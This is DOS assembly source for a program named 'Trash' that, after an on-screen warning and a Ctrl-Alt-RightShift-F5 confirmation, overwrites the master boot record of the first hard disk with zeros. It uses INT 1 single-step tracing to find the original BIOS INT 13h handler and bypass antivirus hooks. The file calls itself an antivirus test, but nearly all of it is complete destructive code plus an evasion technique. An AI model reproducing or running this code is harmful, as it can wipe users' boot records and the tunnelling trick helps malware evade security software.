	page	,132
	title	Trash - smashes the boot record on the first hard disk
	name	TRASH

	.radix	16

code	segment
	assume	cs:code,ds:code

	org	100

CODEX	equ	0C000		; Or use 0300 when tracing DOS

CR	equ	0Dh
LF	equ	0A

start:
	jmp	do_it

oldint1 dd	?
newintx dd	?
oldintx dd	?
trace	db	1
found	db	0
buffer	db	200 dup (0)
message db	CR,LF,'**********  W A R N I N G ! ! !  **********',CR,LF,CR,LF
	db	'This program, when run, will zero (DESTROY!) the',CR,LF
	db	'master boot record of your first hard disk.',CR,LF,CR,LF
	db	'The purpose of this is to test the antivirus software,',CR,LF
	db	'so be sure you have installed your favourite',CR,LF
	db	'protecting program before running this one!',CR,LF
	db	"(It's almost sure it will fail to protect you anyway!)",CR,LF
	db	CR,LF,'Press any key to abort, or',CR,LF
	db	'press Ctrl-Alt-RightShift-F5 to proceed (at your own risk!) $'
warned	db	CR,LF,CR,LF,'Allright, you were warned!',CR,LF,'$'

do_it:
	mov	ax,600		; Clear the screen by scrolling it up
	mov	bh,7
	mov	dx,1950
	xor	cx,cx
	int	10

	mov	ah,0F		; Get the current video mode
	int	10		;  (the video page, more exactly)

	mov	ah,2		; Home the cursor
	xor	dx,dx
	int	10

	mov	ah,9		; Print a warning message
	mov	dx,offset message
	int	21

	mov	ax,0C08 	; Flush the keyboard and get a char
	int	21
	cmp	al,0		; Extendet ASCII?
	jne	quit1		; Exit if not
	mov	ah,8		; Get the key code
	int	21
	cmp	al,6C		; Shift-F5?
	jne	quit1		; Exit if not
	mov	ah,2		; Get keyboard shift status
	int	16
	and	al,1101b	; Ctrl-Alt-RightShift?
	jnz	proceed 	; Proceed if so
quit1:
	jmp	quit		; Otherwise exit

proceed:
	mov	ah,9		; Print the last message
	mov	dx,offset warned
	int	21

	mov	ax,3501 	; Get interrupt vector 1 (single steping)
	int	21
	mov	word ptr oldint1,bx
	mov	word ptr oldint1+2,es

	mov	ax,2501 	; Set new INT 1 handler
	mov	dx,offset newint1
	int	21

	mov	ax,3513 	; Get interrupt vector 13
	int	21
	mov	word ptr oldintx,bx
	mov	word ptr oldintx+2,es
	mov	word ptr newintx,bx
	mov	word ptr newintx+2,es

; The following code is sacred in it's present form.
; To change it would cause volcanos to errupt,
; the ground to shake, and program not to run!

	mov	ax,200
	push	ax
	push	cs
	mov	ax,offset done
	push	ax
	mov	ax,100
	push	ax
	push	cs
	mov	ax,offset faddr
	push	ax
	mov	ah,55
	iret

	assume	ds:nothing

faddr:
	jmp	oldintx

newint1:
	push	bp
	mov	bp,sp
	cmp	trace,0
	jne	search
exit:
	and	[bp+6],not 100
exit1:
	pop	bp
	iret
search:
	cmp	[bp+4],CODEX
	jb	exit1
;Or use ja if you want to trace DOS-owned interrupt
	push	ax
	mov	ax,[bp+4]
	mov	word ptr newintx+2,ax
	mov	ax,[bp+2]
	mov	word ptr newintx,ax
	pop	ax
	mov	found,1
	mov	trace,0
	jmp	exit

	assume	ds:code
done:
	mov	trace,0
	push	ds
	mov	ax,word ptr oldint1+2
	mov	dx,word ptr oldint1
	mov	ds,ax
	mov	ax,2501 	; Restore old INT 1 handler
	int	21
	pop	ds

; Code beyong this point is not sacred...
; It may be perverted in any manner by any pervert.

	cmp	found,1 	; See if original INT 13 handler found
	jne	quit		; Exit if not
	push	ds
	pop	es		; Restore ES

	mov	ax,301		; Write 1 sector
	mov	cx,1		; Cylinder 0, sector 1
	mov	dx,80		; Head 0, drive 80h
	mov	bx,offset buffer
	pushf			; Simulate INT 13
	call	newintx 	; Do it

quit:
	mov	ax,4C00 	; Exit program
	int	21

code	ends
	end	start
